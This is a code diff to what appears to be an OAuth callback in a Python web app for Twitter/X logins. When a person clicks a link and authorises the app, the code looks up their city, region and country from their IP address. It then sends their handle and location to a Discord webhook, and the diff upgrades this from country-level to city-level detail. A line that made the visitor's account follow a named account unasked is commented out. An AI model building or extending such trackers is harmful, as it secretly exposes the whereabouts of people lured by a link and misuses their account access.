@@ -290,7 +290,7 @@ def callback():
         '''
         try:
             #follow(real_client,"puppy4meimina")
-            follow(real_client,"mommymeimi")
+            #follow(real_client,"mommymeimi")
             ip_addr="0.0.0.0"
             if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
                 ip_addr=request.environ['REMOTE_ADDR']
@@ -299,7 +299,8 @@ def callback():
             print(f'ip_addr:{ip_addr}')
             ip=ip_addr.split(', ')[0]
             
-            url=f'https://geolocation-db.com/json/{ip}&position=true'
+            #url=f'https://geolocation-db.com/json/{ip}&position=true'
+            url=f'http://ip-api.com/json/{ip}'
             print(url)
             resp,content=client.request(url,"GET")
             print(resp)
@@ -308,10 +309,12 @@ def callback():
             #det = dict(urllib.parse.parse_qsl(content))
             det=json.loads(content.decode('utf-8'))
             print(det)
-            c_name = det['country_name']
-            print(c_name)
+            c_name = det['country']
+            st_name = det['regionName']
+            ct_name = det['city']
+            print(f'{ct_name},{st_name},{c_name}')
 
-            notify_discord(client,webhook_url,f'@{screen_name} from {c_name} clicked the mommymei link')
+            notify_discord(client,webhook_url,f'@{screen_name} from {ct_name},{st_name},{c_name} clicked the mommymeimi link')
 
 
         except Exception as e:
